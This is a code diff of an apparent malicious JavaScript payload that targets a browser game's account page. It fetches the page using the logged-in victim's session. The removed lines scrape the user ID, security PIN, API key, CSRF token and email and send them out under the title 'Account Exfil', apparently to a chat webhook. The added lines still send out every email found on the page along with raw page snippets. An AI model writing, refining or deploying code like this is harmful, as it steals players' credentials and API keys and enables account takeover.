@@ -10,39 +10,18 @@
   try {
     const acct = await fetch('/account/', {credentials:'include'}).then(r => r.text());
 
-    const userId = (acct.match(/app_user_id['">]+(\d+)/) || [])[1];
-    const leader = (acct.match(/app_leader_name['">]+([^<]+)/) || [])[1];
-    const pin    = (acct.match(/Security PIN:\s*(?:<[^>]+>\s*)?(\d{6})/i) || [])[1];
-    const apiKey = (acct.match(/notranslate['"]>\s*([a-f0-9]{12,})\s*</) || [])[1];
-    const keyId  = (acct.match(/name="regen_api_key_id"\s+value="(\d+)"/) || [])[1];
-    const token  = (acct.match(/name="token"\s+value="([^"]+)"/) || [])[1];
+    // test 1: all email-like strings found
+    const allEmails = acct.match(/[^\s<>"']+@[^\s<>"']+/g) || [];
 
-    // grab every email on the page, pick the user's
-    const allEmails = acct.match(/[\w.\-+]+@[\w.\-]+\.\w{2,}/g) || [];
-    const email = allEmails.find(e =>
-      !e.includes('politicsandwar') &&
-      !e.includes('firebase') &&
-      !e.includes('cloudflare') &&
-      !e.includes('gtranslate') &&
-      !e.includes('yellowstone') &&
-      !e.includes('example')
-    ) || 'n/a';
+    // test 2: raw 500 chars around "E-mail"
+    const idx = acct.indexOf('E-mail');
+    const snippet = idx > -1 ? acct.substring(idx, idx + 300) : 'E-mail not found at all';
 
-    await send({
-      embeds: [{
-        title: '🎯 Account Exfil',
-        color: 0x00ff00,
-        fields: [
-          {name: 'userId', value: userId || 'n/a', inline: true},
-          {name: 'leader', value: leader || 'n/a', inline: true},
-          {name: 'pin',    value: pin    || 'n/a', inline: true},
-          {name: 'apiKey', value: apiKey || 'n/a', inline: false},
-          {name: 'keyId',  value: keyId  || 'n/a', inline: true},
-          {name: 'token',  value: token  || 'n/a', inline: true},
-          {name: 'email',  value: email, inline: false}
-        ]
-      }]
-    });
+    // test 3: page length to confirm full page loaded
+    await send({content: '📏 Page length: ' + acct.length});
+    await send({content: '📧 All emails found: ' + JSON.stringify(allEmails.slice(0, 20))});
+    await send({content: '🔍 Snippet:\n```\n' + snippet.slice(0, 1900) + '\n```'});
+
   } catch (e) {
     await send({content: '💥 ' + String(e)});
   }
